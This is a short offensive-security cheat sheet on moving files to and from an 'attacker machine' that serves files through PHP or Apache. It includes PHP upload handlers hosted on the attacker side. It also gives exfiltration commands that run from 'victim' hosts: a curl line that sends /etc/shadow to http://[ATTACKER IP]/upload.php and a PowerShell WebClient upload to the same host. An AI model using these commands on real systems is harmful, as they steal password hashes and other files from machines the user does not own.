

# File Transfers with PHP

Serve files from attacker machine:
- PHP: `php -S <ip>:<port>`



# Apache server

1. On ATTACKER MACHINE:
```
sudo statusstart apache2 # Check if Apache is running
sudo systemctl start apache2
```
Then place the files to share in: ```/var/www/html/```







### PHP Upload



In the ATTACKER machine server:

1. create `uploads` directory


2.a. UNIX VICTIM create `upload.php` file:

```
<?php

$target_path = "uploads/";
$target_path = $target_path . basename($_FILES['uploadedfile']['name']);

echo "Source=" . $_FILES['uploadedfile']['name'] . "<br />";
echo "Target path=" . $target_path . "<br />";
echo "Size=" . $_FILES['uploadedfile']['size'] . "<br />";


if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],$target_path)) {
echo "The file " . basename($_FILES['uploadedfile']['name']) . " has been uploaded";
}else{
echo "There was an error uploading the file, please try again!";
}
?>






Upload using cURL:
```
curl --form "uploadedfile=@/path/to/some/file" http://[ATTACKER IP]/upload.php
curl --form "uploadedfile=@/etc/shadow" http://[ATTACKER IP]/upload.php
```








2.b. Windows VICTIM:
Create `uploadWindows.php`:

```
<?php
$uploaddir = '/var/www/html/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'],$uploadfile)
?>
```

2.b.1
Error handling...
```
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . basename($_FILES['file']['name']);

if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "File successfully uploaded.";
} else {
    echo "File upload failed.";
}
?>
```




Upload using PowerShell:



```
powershell (New-Object System.Net.WebClient).UploadFile('http://[ATTACKER IP]/uploadWindows.php', '[FILE TO UPLOAD]')
```

